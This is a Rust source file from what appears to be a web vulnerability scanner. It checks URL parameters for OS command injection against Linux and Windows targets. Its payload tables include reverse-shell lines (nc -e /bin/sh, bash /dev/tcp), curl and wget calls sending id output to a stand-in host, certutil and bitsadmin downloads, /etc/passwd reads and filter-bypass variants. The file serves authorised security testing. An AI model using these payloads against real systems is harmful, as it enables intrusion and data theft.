//! Command Injection detection — OS-specific, multi-language, WAF bypass, chained, second-order.

use grym_core::{
    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
    TechniqueTier,
};
use regex::Regex;
use url::Url;

const CMD_PARAMS: &[&str] = &[
    "cmd",
    "command",
    "exec",
    "run",
    "ping",
    "nslookup",
    "traceroute",
    "trace",
    "host",
    "whois",
    "dig",
    "file",
    "dir",
    "ls",
    "cat",
    "tail",
    "head",
    "more",
    "less",
    "query",
    "search",
    "find",
    "grep",
    "awk",
    "sed",
    "sort",
    "uniq",
    "wget",
    "curl",
    "netcat",
    "nc",
    "ssh",
    "telnet",
    "ftp",
    "smtp",
    "mail",
    "send",
    "receive",
    "download",
    "upload",
    "open",
    "system",
    "shell",
    "bash",
    "sh",
    "powershell",
    "pwsh",
    "cmd.exe",
    "process",
    "eval",
    "assert",
    "system",
    "popen",
    "passthru",
    "shell_exec",
    "exec",
    "proc_open",
    "hostname",
    "ipconfig",
    "ifconfig",
    "uname",
    "version",
    "php",
    "python",
    "perl",
    "ruby",
    "node",
    "java",
    "git",
    "svn",
    "hg",
    "tar",
    "zip",
    "unzip",
    "gzip",
    "gpg",
    "openssl",
    "ssh-keygen",
    "base64",
    "md5sum",
    "sha1sum",
    "date",
    "time",
    "uptime",
    "who",
    "w",
    "last",
    "history",
    "ps",
    "top",
    "kill",
    "service",
    "systemctl",
    "journalctl",
    "dmesg",
    "df",
    "du",
    "mount",
    "free",
    "stat",
    "chmod",
    "chown",
    "mkdir",
    "rm",
    "cp",
    "mv",
    "touch",
    "ln",
    "route",
    "arp",
    "netstat",
    "ss",
    "lsof",
    "fuser",
    "iostat",
    "vmstat",
    "sar",
    "crontab",
    "at",
    "batch",
    "cron",
    "mailx",
    "sendmail",
    "logger",
    "syslog",
    "hostnamectl",
    "timedatectl",
    "localectl",
    "useradd",
    "userdel",
    "passwd",
    "groupadd",
    "su",
    "sudo",
    "env",
    "export",
    "printenv",
    "set",
    "unset",
    "alias",
    "type",
    "which",
    "whereis",
    "locate",
    "man",
    "help",
    "info",
    "apropos",
    "whatis",
];

const CMD_LINUX_PAYLOADS: &[(&str, &[&str])] = &[
    (
        "sleep",
        &[
            ";sleep 3",
            "|sleep 3",
            "`sleep 3`",
            "$(sleep 3)",
            "&sleep 3",
            "&&sleep 3",
            "||sleep 3",
            "|;sleep 3",
            ";\n sleep 3",
            "%0asleep%203",
            "%0asleep%203%0a",
            "$(sleep 3)#",
            "`sleep 3`#",
            "&sleep 3#",
            "|sleep 3#",
            "|| sleep 3#",
            "&& sleep 3#",
        ],
    ),
    (
        "ping",
        &[
            ";ping -c 3 127.0.0.1",
            "|ping -c 3 127.0.0.1",
            "&ping -c 3 127.0.0.1",
            "&&ping -c 3 127.0.0.1",
            "||ping -c 3 127.0.0.1",
            "`ping -c 3 127.0.0.1`",
            "$(ping -c 3 127.0.0.1)",
            ";ping -c 3 127.0.0.1#",
            "%0aping%20-c%203%20127.0.0.1",
        ],
    ),
    (
        "echo",
        &[
            ";echo GRYM_TEST",
            "|echo GRYM_TEST",
            "`echo GRYM_TEST`",
            "$(echo GRYM_TEST)",
            "&echo GRYM_TEST",
            "&&echo GRYM_TEST",
            "||echo GRYM_TEST",
            ";echo GRYM_TEST#",
            "%0aecho%20GRYM_TEST",
            "`echo GRYM_TEST`#",
            "$(echo GRYM_TEST)#",
            ";echo $((6*7))",
        ],
    ),
    (
        "whoami",
        &[
            ";whoami",
            "|whoami",
            "`whoami`",
            "$(whoami)",
            "&whoami",
            "&&whoami",
            "||whoami",
            ";whoami#",
            "%0awhoami",
            "$(whoami)#",
            "`whoami`#",
            "|whoami#",
        ],
    ),
    (
        "id",
        &[
            ";id", "|id", "`id`", "$(id)", "&id", "&&id", "||id", ";id#", "%0aid", "`id`#",
            "$(id)#",
        ],
    ),
    (
        "cat_passwd",
        &[
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "&cat /etc/passwd",
            "&&cat /etc/passwd",
            "||cat /etc/passwd",
            ";cat /etc/passwd#",
            "%0acat%20/etc/passwd",
            "`cat /etc/passwd`#",
            "$(cat /etc/passwd)#",
            ";cat${IFS}/etc/passwd",
            "|cat${IFS}/etc/passwd",
            ";c\\at /etc/passwd",
            ";ca''t /etc/passwd",
            ";ca\"\"t /etc/passwd",
            "|/bin/cat /etc/passwd",
            "$(cat${IFS}/etc/passwd)",
        ],
    ),
    (
        "curl_oob",
        &[
            ";curl http://oob.test/$(id)",
            "|curl http://oob.test/$(id)",
            "&curl http://oob.test/$(id)",
            "`curl http://oob.test/$(id)`",
            "$(curl http://oob.test/$(id))",
            ";curl${IFS}http://oob.test/$(id)",
            ";cur''l http://oob.test/$(id)",
            ";c\\url http://oob.test/$(id)",
        ],
    ),
    (
        "wget_oob",
        &[
            ";wget http://oob.test/$(whoami)",
            "|wget http://oob.test/$(whoami)",
            "&wget http://oob.test/$(whoami)",
            "`wget http://oob.test/$(whoami)`",
            "$(wget http://oob.test/$(whoami))",
            ";wge''t http://oob.test/$(whoami)",
            ";w\\get http://oob.test/$(whoami)",
        ],
    ),
    (
        "uname",
        &[
            ";uname -a",
            "|uname -a",
            "`uname -a`",
            "$(uname -a)",
            "&uname -a",
            ";uname${IFS}-a",
            "%0auname%20-a",
        ],
    ),
    (
        "ls_root",
        &[
            ";ls -la /",
            "|ls -la /",
            "`ls -la /`",
            "$(ls -la /)",
            "&ls -la /",
            "&&ls -la /",
            ";ls${IFS}-la${IFS}/",
            "`ls${IFS}-la${IFS}/`",
        ],
    ),
    (
        "php",
        &[
            ";php -r 'echo GRYM_TEST;'",
            "|php -r 'echo GRYM_TEST;'",
            "&php -r 'echo GRYM_TEST;'",
            "$(php -r 'echo GRYM_TEST;')",
            "`php -r 'echo GRYM_TEST;'`",
            ";php${IFS}-r${IFS}'echo GRYM_TEST;'",
            ";php -r 'system(\"id\");'",
        ],
    ),
    (
        "python",
        &[
            ";python -c 'import os; os.system(\"echo GRYM_TEST\")'",
            "|python -c 'import os; os.system(\"echo GRYM_TEST\")'",
            "$(python -c 'import os; os.system(\"echo GRYM_TEST\")')",
            ";python3 -c 'import os; os.system(\"echo GRYM_TEST\")'",
            ";python2 -c 'import os; os.system(\"echo GRYM_TEST\")'",
            ";python -c 'import os; os.popen(\"id\").read()'",
            ";python -c \"import os; os.system('echo GRYM_TEST')\"",
        ],
    ),
    (
        "perl",
        &[
            ";perl -e 'system(\"echo GRYM_TEST\")'",
            "|perl -e 'system(\"echo GRYM_TEST\")'",
            "$(perl -e 'system(\"echo GRYM_TEST\")')",
            ";perl -e 'print `id`'",
            ";perl -MIO::Socket::INET -e 'print qq(x)'",
        ],
    ),
    (
        "ruby",
        &[
            ";ruby -e 'puts %x(id)'",
            "|ruby -e 'puts %x(id)'",
            "$(ruby -e 'puts %x(id)')",
            ";ruby -e 'system(\"echo GRYM_TEST\")'",
            ";ruby -e 'exec \"id\"'",
        ],
    ),
    (
        "node",
        &[
            ";node -e 'console.log(require(\"child_process\").execSync(\"id\").toString())'",
            "|node -e 'console.log(require(\"child_process\").execSync(\"id\").toString())'",
            "$(node -e 'console.log(require(\"child_process\").execSync(\"id\").toString())')",
            ";node -e 'require(\"child_process\").exec(\"echo GRYM_TEST\")'",
        ],
    ),
    (
        "sh_ifs",
        &[
            ";{cat,/etc/passwd}",
            "|{cat,/etc/passwd}",
            "`{cat,/etc/passwd}`",
            "$({cat,/etc/passwd})",
            ";{ls,-la}",
            ";$({cat,/etc/passwd})",
        ],
    ),
    (
        "base64_decode",
        &[
            ";echo Z3J5bQ==|base64 -d",
            "|echo Z3J5bQ==|base64 -d",
            ";echo${IFS}Z3J5bQ==|base64${IFS}-d",
            ";base64 -d /etc/passwd",
        ],
    ),
    (
        "env_redir",
        &[
            ";env 2>&1 | grep -i grym",
            ";printenv",
            "|printenv",
            ";env${IFS}|${IFS}grep${IFS}-i${IFS}home",
        ],
    ),
    (
        "hostname_oob",
        &[
            ";hostname",
            "|hostname",
            "`hostname`",
            "$(hostname)",
            ";hostname -I",
            ";ip a",
            "|ip addr",
            ";cat /etc/hostname",
            "$(cat /etc/hostname)",
        ],
    ),
    (
        "nc_rev",
        &[
            ";nc -e /bin/sh 127.0.0.1 4444",
            "|nc -e /bin/sh 127.0.0.1 4444",
            ";nc 127.0.0.1 4444 -e /bin/sh",
            ";bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'",
            ";/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'",
            "$(bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1')",
        ],
    ),
    (
        "awk_grep",
        &[
            ";awk 'BEGIN{print \"GRYM_TEST\"}'",
            "|awk 'BEGIN{print \"GRYM_TEST\"}'",
            ";awk 'BEGIN{system(\"id\")}'",
            ";grep root /etc/passwd",
            "|grep root /etc/passwd",
            ";grep${IFS}root${IFS}/etc/passwd",
        ],
    ),
    (
        "tar_zip",
        &[
            ";tar -cf /tmp/g.tar /etc/passwd",
            ";zip /tmp/g.zip /etc/passwd",
            ";gzip -c /etc/passwd",
        ],
    ),
    (
        "openssl",
        &[
            ";openssl enc -base64 -in /etc/passwd -out /tmp/g.b64",
            ";openssl rand 5",
        ],
    ),
    (
        "date_uptime",
        &[
            ";date",
            "|date",
            "`date`",
            "$(date)",
            ";uptime",
            "|uptime",
            ";date +%s",
            "$(date +%s)",
        ],
    ),
    (
        "ps_proc",
        &[
            ";ps aux",
            "|ps aux",
            "$(ps aux)",
            ";ps auxww",
            ";ps -ef",
            "|ss -tulpn",
            ";netstat -tulpn",
        ],
    ),
    (
        "su_cmds",
        &[
            ";whoami;id",
            ";id;whoami",
            ";echo x;id",
            ";id||echo x",
            ";id&&echo x",
            ";id&echo x",
        ],
    ),
];

const CMD_WINDOWS_PAYLOADS: &[(&str, &[&str])] = &[
    (
        "timeout",
        &[
            "&timeout 5",
            "|timeout 5",
            "&timeout 5#",
            "&timeout /t 5",
            "&&timeout 5",
            "||timeout 5",
            "&timeout 5&",
            "%26timeout%205",
        ],
    ),
    (
        "echo",
        &[
            "&echo GRYM_TEST",
            "|echo GRYM_TEST",
            "&echo GRYM_TEST#",
            "&&echo GRYM_TEST",
            "||echo GRYM_TEST",
            "&echo GRYM_TEST&",
            "%26echo%20GRYM_TEST",
            "&ec''ho GRYM_TEST",
            "&e\\cho GRYM_TEST",
        ],
    ),
    (
        "whoami",
        &[
            "&whoami",
            "|whoami",
            "&whoami#",
            "&&whoami",
            "||whoami",
            "&whoa''mi",
            "&who\\ami",
            "%26whoami",
            "&whoami&",
            "&whoami | findstr /i user",
        ],
    ),
    (
        "systeminfo",
        &[
            "&systeminfo",
            "|systeminfo",
            "&systeminfo#",
            "&&systeminfo",
            "&systeminfo&",
            "%26systeminfo",
        ],
    ),
    (
        "dir",
        &[
            "&dir C:\\",
            "|dir C:\\",
            "&dir C:\\#",
            "&&dir C:\\",
            "&dir C:\\&",
            "&dir%20C:\\",
        ],
    ),
    (
        "powershell",
        &[
            "&powershell -Command \"Write-Host GRYM_TEST\"",
            "|powershell -Command \"Write-Host GRYM_TEST\"",
            "&powershell -Command \"whoami\"",
            "&powershell.exe -c whoami",
            "&powershell -enc dwBoAG8AYQBtAGkA",
            "&powershell -nop -c whoami",
            "&po''wershell -c whoami",
            "&pow\\ershell -c whoami",
            "&powershell -c 'whoami'",
            "&powershell -e JABwAHMAYQB0AHUAcwA9AGcAZQB0AC0AZABhAHQAZQB0AGkAbQBlAA==",
        ],
    ),
    (
        "type",
        &[
            "&type C:\\windows\\win.ini",
            "|type C:\\windows\\win.ini",
            "&type C:\\windows\\win.ini#",
            "&&type C:\\windows\\win.ini",
            "&type C:\\windows\\win.ini&",
            "&type C:\\windows\\system32\\drivers\\etc\\hosts",
            "&t''ype C:\\windows\\win.ini",
            "&ty\\pe C:\\windows\\win.ini",
            "&type C:\\windows\\win.ini | findstr /i fonts",
        ],
    ),
    (
        "ipconfig",
        &[
            "&ipconfig /all",
            "|ipconfig /all",
            "&ipconfig /all#",
            "&&ipconfig /all",
            "&ipconfig /all&",
            "&ipconfig%20/all",
        ],
    ),
    (
        "net user",
        &[
            "&net user",
            "|net user",
            "&net user#",
            "&&net user",
            "&net user&",
            "&net user%20",
            "&net user | findstr /i \"Administrator\"",
            "&net user",
        ],
    ),
    ("net view", &["&net view", "|net view", "&net view /all"]),
    (
        "hostname",
        &[
            "&hostname",
            "|hostname",
            "&hostname#",
            "&&hostname",
            "&hostname&",
            "%26hostname",
        ],
    ),
    (
        "tasklist",
        &[
            "&tasklist",
            "|tasklist",
            "&tasklist /v",
            "&tasklist /fo csv",
        ],
    ),
    ("ver", &["&ver", "|ver", "&ver#", "&&ver"]),
    ("cd", &["&cd", "|cd", "&cd C:\\"]),
    (
        "set",
        &["&set", "|set", "&set | findstr /i user", "&set PATH"],
    ),
    (
        "whoami_all",
        &[
            "&whoami /all",
            "|whoami /priv",
            "&whoami /groups",
            "&whoami /upn",
        ],
    ),
    (
        "cmd_c",
        &[
            "&cmd /c whoami",
            "&cmd /c dir C:\\",
            "|cmd /c whoami",
            "&cmd.exe /c whoami",
            "&cm''d /c whoami",
            "&c\\md /c whoami",
        ],
    ),
    (
        "certutil",
        &[
            "&certutil -urlcache -split -f http://oob.test/x.txt",
            "&certutil -encode C:\\windows\\win.ini C:\\temp\\g.txt",
        ],
    ),
    (
        "bitsadmin",
        &[
            "&bitsadmin /transfer x http://oob.test/x.txt C:\\temp\\g.txt",
            "&bitsadmin /rawreturn /transfer x http://oob.test/x.txt C:\\temp\\g.txt",
        ],
    ),
    (
        "wmic",
        &[
            "&wmic os get caption",
            "|wmic process get name",
            "&wmic qfe list",
        ],
    ),
    (
        "reg",
        &[
            "&reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "&reg query HKCU /f pass /s",
        ],
    ),
    (
        "nslookup_oob",
        &["&nslookup oob.test", "&nslookup %USERNAME%.oob.test"],
    ),
    ("sc", &["&sc query", "|sc queryex type=service"]),
    (
        "findstr",
        &[
            "&findstr /s /i \"grym\" C:\\*.ini",
            "&findstr /i \"user\" C:\\windows\\win.ini",
        ],
    ),
    (
        "for_loop",
        &[
            "&for /f \"delims=\" %a in ('whoami') do echo %a",
            "&for %i in (1 2 3) do echo %i",
        ],
    ),
    (
        "delayed",
        &["&set x=GRYM&&echo %x%", "&set x=GRYM&echo %x%"],
    ),
    ("conhost", &["&conhost whoami", "&conhost cmd /c whoami"]),
    (
        "start",
        &[
            "&start calc",
            "&start /b cmd /c whoami",
            "&start powershell -c whoami",
        ],
    ),
    (
        "rundll32",
        &[
            "&rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)",
            "&rundll32 user32.dll,MessageBoxA 0 x 0",
        ],
    ),
    (
        "mshta",
        &[
            "&mshta javascript:alert(1)",
            "&mshta vbscript:msgbox(1)",
            "&mshta \"javascript:new ActiveXObject('WScript.Shell').Run('whoami')\"",
        ],
    ),
];

const CMD_PAYLOADS_BLIND: &[(&str, &[&str])] = &[
    (
        "whoami_redirect",
        &[
            "; whoami > /tmp/GRYM && echo Done",
            "| whoami > /tmp/GRYM && echo Done",
            "& whoami > /tmp/GRYM && echo Done",
            "`whoami > /tmp/GRYM`",
            "$(whoami > /tmp/GRYM)",
        ],
    ),
    (
        "uname_file",
        &[
            "; uname -a > /tmp/GRYM && echo Done",
            "| uname -a > /tmp/GRYM && echo Done",
            "& uname -a > /tmp/GRYM && echo Done",
        ],
    ),
    (
        "env_file",
        &[
            "; env > /tmp/GRYM && echo Done",
            "| env > /tmp/GRYM && echo Done",
        ],
    ),
    (
        "id_file",
        &[
            "; id 2>&1 > /tmp/GRYM",
            "| id 2>&1 > /tmp/GRYM",
            "& id 2>&1 > /tmp/GRYM",
        ],
    ),
    (
        "win_whoami_file",
        &[
            "& whoami > C:\\windows\\temp\\GRYM.txt && echo Done",
            "| whoami > C:\\windows\\temp\\GRYM.txt && echo Done",
            "& whoami > %temp%\\GRYM.txt",
            "& cmd /c \"whoami > %temp%\\GRYM.txt\"",
        ],
    ),
    (
        "sleep_alt",
        &[
            "; sleep 3 && echo GRYM_DONE",
            "| sleep 3 && echo GRYM_DONE",
            "& sleep 3 && echo GRYM_DONE",
            "$(sleep 3 && echo GRYM_DONE)",
            "`sleep 3 && echo GRYM_DONE`",
        ],
    ),
    (
        "curl_file",
        &[
            "; curl http://oob.test/$(id) > /tmp/GRYM",
            "| curl http://oob.test/$(id) > /tmp/GRYM",
            "; wget -O /tmp/GRYM http://oob.test/x",
        ],
    ),
];

const CMD_ERROR_PATTERNS: &[&str] = &[
    r"(?i)command not found",
    r"(?i)sh:\s",
    r"(?i)bash:\s",
    r"(?i)system32",
    r"(?i)output.*of.*command",
    r"(?i)exec\(\)",
    r"(?i)shell_exec",
    r"(?i)system\(\)",
    r"(?i)popen\(\)",
    r"(?i)passthru\(\)",
    r"(?i)GRYM_TEST",
    r"(?i)uid=",
    r"(?i)root:",
    r"(?i)bin/bash",
    r"(?i)uid=[0-9]+",
    r"(?i)gid=[0-9]+",
    r"(?i)groups=",
    r"(?i)Not recognized as an internal",
    r"(?i)is not recognized",
    r"(?i)Disallowed command",
    r"(?i)Service not implemented",
    r"(?i)Command execution error",
    r"(?i)permission denied",
    r"(?i)no such file or directory",
    r"(?i)GRYM_DONE",
    r"(?i)GRYM$",
    r"(?i)Administrator",
    r"(?i)NT AUTHORITY",
    r"(?i)linux version",
    r"(?i)linux [0-9]+\.[0-9]+",
    r"(?i)total [0-9]+",
    r"(?i)drwx",
    r"(?i)uptime",
    r"(?i)load average",
    r"(?i)whoami.exe",
    r"(?i)\bhostname\b",
    r"(?i)Linux box",
    r"(?i)\d+:\d+:\d+ up",
    r"(?i)Microsoft Windows",
    r"(?i)GNU bash",
    r"(?i)sh-[0-9]",
    r"(?i)-bash",
    r"(?i)\[/usr/bin|/bin/(ba)?sh",
];

pub async fn check_command_injection(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    let base_query: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();

    if base_query.is_empty() {
        return Ok(findings);
    }

    for (param_name, _value) in &base_query {
        if !CMD_PARAMS.contains(&param_name.as_str()) {
            continue;
        }

        for payload_batch in [CMD_LINUX_PAYLOADS, CMD_WINDOWS_PAYLOADS].concat() {
            let (_, payloads) = payload_batch;
            for payload in payloads {
                let mut test_url = url.clone();
                {
                    let mut pairs = test_url.query_pairs_mut();
                    pairs.clear();
                    for (k, v) in &base_query {
                        let val = if k == param_name {
                            format!("{}{}", v, payload)
                        } else {
                            v.clone()
                        };
                        pairs.append_pair(k, &val);
                    }
                }

                if let Ok(response) = client
                    .get(
                        "grym-web-scanner",
                        test_url,
                        TechniqueTier::StandardDetection,
                    )
                    .await
                {
                    for pattern in CMD_ERROR_PATTERNS {
                        if let Ok(re) = Regex::new(pattern)
                            && re.is_match(&response.body)
                        {
                            let mut f = Finding::new(
                                format!("Command Injection detected in '{}' parameter", param_name),
                                AssetRef {
                                    identifier: url.to_string(),
                                    kind: "web".into(),
                                },
                                Severity::Critical,
                                Confidence::Confirmed,
                                "grym-web-scanner",
                            );
                            f.categories.push("A05:2025-Injection".into());
                            f.cwe_ids.push(78);
                            f.evidence.push(Evidence::redacted(
                                "cmd-injection",
                                format!("Payload triggered response: {}", payload),
                                response.body.chars().take(200).collect::<String>(),
                            ));
                            f.remediation = "Never pass user input to command interpreters. Use language-native APIs with proper input validation.".into();
                            f.references.push(
                                "https://owasp.org/www-community/attacks/Command_Injection".into(),
                            );
                            findings.push(f);
                            break;
                        }
                    }
                }
            }
        }
    }

    Ok(findings)
}
